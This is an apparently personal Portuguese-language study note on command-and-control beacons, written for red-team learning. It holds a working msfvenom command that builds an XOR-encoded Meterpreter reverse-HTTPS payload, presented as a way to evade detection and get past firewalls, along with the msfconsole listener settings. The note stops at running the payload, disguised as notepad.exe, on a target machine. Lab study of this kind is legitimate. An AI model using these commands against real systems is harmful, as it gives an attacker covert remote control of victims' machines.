
As comunicações de comando e controlo (C&C ou C2) representam interações maliciosas estabelecidas entre um servidor de controlo e um sistema comprometido. O elemento responsável por estabelecer esta ligação, geralmente um ficheiro ou processo malicioso presente na máquina infetada, é conhecido como beacon C2.

Imaginemos um cenário realista: um utilizador recebe um e-mail de phishing e, ao clicar no anexo (um ficheiro `.doc` malicioso), executa sem saber uma macro embutida. Esta macro faz o download de um ficheiro `.exe` alojado num servidor controlado por um atacante. Uma vez executado, esse `.exe` estabelece uma ligação remota com o servidor do atacante, garantindo-lhe acesso persistente à máquina comprometida.

Este ficheiro `.exe`, que mantém comunicações periódicas com o servidor C2, é conhecido como **beacon C2**. 

Embora semelhante a um shell reverso, um beacon C2 vai muito além: 
Integra funcionalidades como elevação de privilégios, movimentação lateral, captura de credenciais e execução modular de comandos. 

Frameworks como **Metasploit**, **Empire**, **Cobalt Strike**, **Sliver**, entre outros, são frequentemente utilizados por equipas de Red Team e por adversários reais para este tipo de operação.

#### Criação de um Beacon C2 com o `msfvenom`

A ferramenta `msfvenom` é parte integrante do **Metasploit Framework** e permite gerar cargas maliciosas (payloads) personalizadas. 

```python
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.4 LPORT=443 -f c -e x64/xor_dynamic -b "\x00"


```


#### Explicação dos parâmetros:

- `-e x64/xor_dynamic`: aplica encoding XOR dinâmico.
    
- `-b "\x00"`: evita caracteres nulos.
    
- Usa `reverse_https` para aumentar stealth e bypass de proxies/firewalls.

![](../anexos/Pasted%20image%2020250503113019.png)

#### Configuração do Listener no Metasploit

No terminal do Metasploit (`msfconsole`), configura-se o listener:

```python
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 192.168.1.4
set LPORT 443
set ExitOnSession false
set EnableStageEncoding true
```

![](../anexos/Pasted%20image%2020250422213710.png)


##### Próximo passo

Agora só falta executar o `notepad.exe` na máquina alvo (Windows) para que a sessão Meterpreter seja iniciada. 




## RESTANTE CONTEUDO EM DESENVOLVIMENTO